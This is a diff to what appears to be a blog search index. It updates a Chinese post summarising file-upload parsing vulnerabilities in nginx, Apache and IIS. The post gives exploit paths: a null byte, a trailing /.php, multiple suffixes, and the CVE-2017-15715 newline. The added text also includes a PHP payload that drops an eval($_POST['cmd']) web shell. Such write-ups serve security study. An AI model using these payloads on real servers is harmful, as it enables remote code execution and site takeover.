@@ -2,8 +2,8 @@
 <search>
   <entry>
     <title><![CDATA[文件上传解析漏洞小结]]></title>
-    <url>%2F2019%2F01%2F20%2F%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造成的解析漏洞 假设你上传了一个图片马，地址为 1http://www.test.com/1.png 那么漏洞地址就是： 1http://www.test.com/1.png/.php apacheapache 2.2.x我不太懂，这里有文档：Apache HTTPD 多后缀解析漏洞 如果运维人员给.php后缀增加了处理器： 1AddType application/x-httpd-php .php 上传1.php.haha的文件 1www.test.com/1.php.haha haha后缀不存在，Apache会左移寻找能解析的后缀，所以最后会解析1.php的内容 apache 2.4.0~2.4.29CVE-2017-15715 直接上传一个1.php文件，然后抓包在后缀名后添加\x0a，然后访问如下网址： 1www.test.com/1.php\x0a IISIIS 61www.test.com/1.asp.jpg 1www.test.com/1.asp/1.jpg IIS 7.512a.jpg是一个图片马，1.php不存在www.test.com/a.jpg/1.php 未完待续······]]></content>
+    <url>%2F2019%2F01%2F20%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx &lt;8.03 空字节代码执行漏洞影响版本：0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37 上传图片马然后这样访问： 1hack.jpg%00.php 就会执行PHP代码 nginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造成的解析漏洞 假设你上传了一个图片马，地址为 1http://www.test.com/1.png 那么漏洞地址就是： 1http://www.test.com/1.png/.php apacheapache 2.2.x我不太懂，这里有文档：Apache HTTPD 多后缀解析漏洞 如果运维人员给.php后缀增加了处理器： 1AddType application/x-httpd-php .php 上传1.php.haha的文件 1www.test.com/1.php.haha haha后缀不存在，Apache会左移寻找能解析的后缀，所以最后会解析1.php的内容 apache 2.4.0~2.4.29 CVE-2017-15715 直接上传一个1.php文件，然后抓包在后缀名后添加\x0a，然后访问如下网址： 1www.test.com/1.php\x0a IISIIS 61www.test.com/1.asp.jpg 1www.test.com/1.asp/1.jpg IIS 7.5IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞 在默认Fast-CGI开启的情况下，上传一个hack.jpg文件，内容中包含： 1&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;])?&gt;&apos;);?&gt; 然后访问hack.jpg/.php，就会在这个目录下生成一句话木马shell.php]]></content>
       <tags>
         <tag>解析漏洞</tag>
       </tags>
